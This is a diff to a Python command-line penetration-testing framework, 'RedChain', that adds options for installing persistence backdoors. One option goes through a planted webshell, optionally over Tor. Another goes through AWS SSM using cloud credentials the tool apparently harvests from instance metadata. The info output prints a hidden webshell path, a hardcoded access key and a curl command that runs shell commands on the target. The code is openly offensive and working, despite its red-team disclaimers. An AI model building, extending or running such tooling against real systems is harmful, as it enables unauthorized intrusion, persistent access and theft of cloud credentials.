@@ -29,7 +29,7 @@ class Colors:
 class RedChainCLI(cmd.Cmd):
     intro = f"""
 {Colors.BOLD}{Colors.FAIL}╔═══════════════════════════════════════════════════════════════╗
-║                        RedChain v2.2                          ║
+║                        RedChain v2.3                          ║
 ║              Integrated Penetration Testing Framework        ║
 ║                                                               ║
 ║  {Colors.WARNING}⚠  교육 및 연구 목적 전용 / Educational Purpose Only{Colors.FAIL}  ║
@@ -485,12 +485,14 @@ class RedChainCLI(cmd.Cmd):
         os.system(ssh_cmd)
 
     def do_persist(self, arg):
-        """Persistence 백도어 설치 (Red Team 시뮬레이션)
+        """Persistence 백도어 설치 (Red Team 시뮬레이션) - SSH 불필요!
 
 사용법:
-    persist install   - 백도어 설치 (사용자 생성, SSH 키, Cron, Systemd, 웹쉘)
-    persist cleanup   - 모든 백도어 제거 및 시스템 복구
-    persist info      - 설치된 백도어 정보 표시
+    persist webshell  - 웹쉘을 통한 백도어 설치 (추천, SSH 불필요)
+    persist ssm       - AWS SSM을 통한 백도어 설치 (SSH 불필요)
+    persist ssh       - SSH를 통한 백도어 설치 (레거시)
+    persist cleanup   - 모든 백도어 제거
+    persist info      - 백도어 정보 표시
 
 경고: 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!
 """
@@ -498,12 +500,76 @@ class RedChainCLI(cmd.Cmd):
             print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
             return
 
-        if not self.ssh_user:
-            print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다.{Colors.ENDC}")
+        # 방식 선택
+        if arg == 'webshell':
+            # 웹쉘 기반 백도어 (SSH 불필요)
+            script_path = self.project_root / '03_Persistence' / 'webshell_backdoor.py'
+
+            if not script_path.exists():
+                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
+                return
+
+            print(f"{Colors.WARNING}[!] 웹쉘을 통한 백도어 설치{Colors.ENDC}")
+            print(f"{Colors.FAIL}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")
+
+            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
+            if confirm.lower() != 'yes':
+                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
+                return
+
+            tor_flag = "--tor" if self.use_tor else ""
+            cmd = f"python3 {script_path} {self.target} {tor_flag}"
+            print(f"{Colors.OKCYAN}[*] 실행 중: {cmd}{Colors.ENDC}\n")
+            os.system(cmd)
             return
 
-        # 스크립트 선택
-        if arg == 'cleanup':
+        elif arg == 'ssm':
+            # AWS SSM 기반 백도어 (SSH 불필요)
+            script_path = self.project_root / '03_Persistence' / 'ssm_backdoor.py'
+
+            if not script_path.exists():
+                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
+                return
+
+            print(f"{Colors.WARNING}[!] AWS SSM을 통한 백도어 설치{Colors.ENDC}")
+            print(f"{Colors.FAIL}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")
+
+            # credentials 확인
+            if not self.aws_credentials:
+                print(f"{Colors.WARNING}[!] AWS credentials 로드 중...{Colors.ENDC}\n")
+                self.aws_credentials = self.load_latest_credentials()
+
+            if not self.aws_credentials:
+                print(f"{Colors.FAIL}[-] AWS credentials를 찾을 수 없습니다{Colors.ENDC}")
+                print(f"{Colors.FAIL}[-] 먼저 'imds' 명령어를 실행하세요{Colors.ENDC}")
+                return
+
+            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
+            if confirm.lower() != 'yes':
+                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
+                return
+
+            # 환경 변수로 credentials 전달
+            env = os.environ.copy()
+            env['AWS_ACCESS_KEY_ID'] = self.aws_credentials['AccessKeyId']
+            env['AWS_SECRET_ACCESS_KEY'] = self.aws_credentials['SecretAccessKey']
+            env['AWS_SESSION_TOKEN'] = self.aws_credentials.get('Token', '')
+
+            cmd = f"python3 {script_path}"
+            print(f"{Colors.OKCYAN}[*] 실행 중: {cmd}{Colors.ENDC}\n")
+            subprocess.run(cmd, shell=True, env=env)
+            return
+
+        elif arg == 'ssh':
+            # SSH 기반 백도어 (레거시)
+            if not self.ssh_user:
+                print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다{Colors.ENDC}")
+                return
+
+            script_name = 'backdoor_setup.sh'
+            action_msg = "백도어 설치 (SSH)"
+
+        elif arg == 'cleanup':
             script_name = 'cleanup_backdoor.sh'
             action_msg = "백도어 제거"
         elif arg == 'info':
@@ -528,12 +594,20 @@ class RedChainCLI(cmd.Cmd):
             print(f"   - 인증키: RedTeam2024")
             print(f"   - 사용: curl 'http://target/.system/health.php?key=RedTeam2024&cmd=id'\n")
 
-            print(f"{Colors.WARNING}[!] 설치: persist install{Colors.ENDC}")
+            print(f"{Colors.WARNING}[!] 웹쉘 방식 (추천): persist webshell{Colors.ENDC}")
+            print(f"{Colors.WARNING}[!] AWS SSM 방식: persist ssm{Colors.ENDC}")
+            print(f"{Colors.WARNING}[!] SSH 방식: persist ssh{Colors.ENDC}")
             print(f"{Colors.WARNING}[!] 제거: persist cleanup{Colors.ENDC}\n")
             return
         else:
-            script_name = 'backdoor_setup.sh'
-            action_msg = "백도어 설치"
+            print(f"{Colors.FAIL}[-] 알 수 없는 옵션: {arg}{Colors.ENDC}")
+            print(f"{Colors.OKBLUE}[*] 사용법: persist [webshell|ssm|ssh|cleanup|info]{Colors.ENDC}\n")
+            return
+
+        # SSH/cleanup 방식 (레거시)
+        if not self.ssh_user:
+            print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다{Colors.ENDC}")
+            return
 
         script_path = self.project_root / '03_Persistence' / script_name
 
